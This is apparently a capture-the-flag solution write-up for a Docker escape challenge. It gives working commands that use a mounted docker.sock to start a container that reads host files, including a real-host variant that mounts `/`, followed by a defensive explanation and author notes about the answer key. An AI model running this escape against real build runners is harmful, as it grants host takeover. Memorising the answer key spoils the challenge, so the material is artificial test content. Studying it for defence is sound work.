# Solution: Escape the Job — runner-docker-escape

**Storyline:** Operation Coinnectar (HaxNation × FOSS Mumbai) — Chapter 11
**Difficulty:** Hard (Insane in the live event) · **Points:** 500 · **Answer format:** `HXN{...}`

## Walkthrough (local lab)

1. `docker compose up -d && docker exec -it coinnectar-build-job sh`

2. Confirm what the sandbox can reach: the Docker daemon socket.
   ```sh
   docker version
   docker ps
   ```

3. Ask the daemon for its own map of the world — volumes live on the host, not in any container:
   ```sh
   docker volume ls          # look for coinnectar-host-root
   ```

4. Ask it to start a new container mounting that volume (read-only is enough):
   ```sh
   docker run --rm -v coinnectar-host-root:/mnt alpine cat /mnt/flag2.txt
   ```

5. The flag is stored base64-encoded — decode and submit:
   ```sh
   echo '<recovered>' | base64 -d
   ```

The canonical variant of this escape (against a real host rather than a lab VM) mounts `/` with `-v /:/host` and reads files straight off the host — the shape is the same; the daemon is always the confused deputy.

## Why it matters

Mounting `docker.sock` into untrusted build jobs (PRs from forks, eval jobs, "help me build this repo" environments) is remote code execution on the runner host by construction — no kernel exploit needed. Builds must run rootless or in microVMs, and the socket must never cross a trust boundary.

## Notes for authors

- This lab flag differs from the live-event instance flag; the challenge checks the lab flag (see `flag_hashes` in `challenge.json`). The answer-key commit can re-point the lab at the original flag.
- The hostfs-init step writes the flag as base64 to honour the "not stored in the clear" hint; `host-machine` mounts it read-only.
